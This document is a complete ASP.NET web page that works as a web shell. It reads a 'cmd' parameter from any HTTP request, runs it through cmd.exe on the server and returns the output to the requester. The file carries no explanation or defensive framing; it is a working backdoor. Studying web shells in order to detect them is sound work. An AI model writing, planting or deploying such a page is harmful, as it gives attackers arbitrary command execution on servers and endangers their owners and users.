<%@ Page Language="C#" %>
<%
string cmd = Request["cmd"];
if (!string.IsNullOrEmpty(cmd)) {
    System.Diagnostics.Process p = new System.Diagnostics.Process();
    p.StartInfo.FileName = "cmd.exe";
    p.StartInfo.Arguments = "/c " + cmd;
    p.StartInfo.RedirectStandardOutput = true;
    p.StartInfo.UseShellExecute = false;
    p.Start();
    Response.Write(p.StandardOutput.ReadToEnd());
}
%>